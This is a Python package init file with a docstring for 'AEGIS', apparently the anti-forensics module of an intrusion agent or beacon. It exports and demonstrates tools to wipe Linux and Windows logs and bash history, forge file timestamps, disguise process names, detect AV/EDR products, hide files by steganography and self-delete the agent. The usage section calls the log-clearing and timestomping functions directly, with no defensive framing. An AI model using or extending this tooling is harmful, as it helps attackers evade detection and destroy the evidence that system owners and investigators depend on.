"""
AEGIS-Advanced Node OPSEC Package
====================================
Anti-forensics and operational security: log clearing, timestomping,
process masking, secure deletion, AV/EDR detection, steganography,
MAC randomization, and self-destruct capabilities.

Exports:
    LogCleaner          — Wipe Linux/Windows logs (20+ log paths)
    Timestomper         — File/directory timestamp manipulation
    ProcessMasker       — Rename process in ps/top output
    SecureDelete        — Multi-pass file shredder
    CacheFlusher        — Flush ARP, DNS, bash history
    AVEDRDetector       — Detect 30+ AV/EDR processes
    StegoHider          — Hide files inside JPEG/PNG via LSB
    SelfDestruct        — Scheduled self-deletion of agent
    full_opsec_sweep    — Convenience function: run all cleanup tasks

Usage:
    from node.opsec import full_opsec_sweep, LogCleaner

    # Full sweep (logs, history, timestamps, caches)
    results = full_opsec_sweep(our_files=["/tmp/.aegis_beacon"])

    # Granular control
    from node.opsec import LogCleaner, Timestomper
    cleaner = LogCleaner()
    cleaner.clear_linux_logs()
    cleaner.clear_bash_history()

    ts = Timestomper()
    ts.copy_timestamps("/bin/ls", "/tmp/myfile")
"""

from .clear_logs import (
    LogCleaner,
    Timestomper,
    ProcessMasker,
    SecureDelete,
    CacheFlusher,
    AVEDRDetector,
    StegoHider,
    SelfDestruct,
    full_opsec_sweep,
)

__all__ = [
    "LogCleaner",
    "Timestomper",
    "ProcessMasker",
    "SecureDelete",
    "CacheFlusher",
    "AVEDRDetector",
    "StegoHider",
    "SelfDestruct",
    "full_opsec_sweep",
]

__version__ = "5.0"
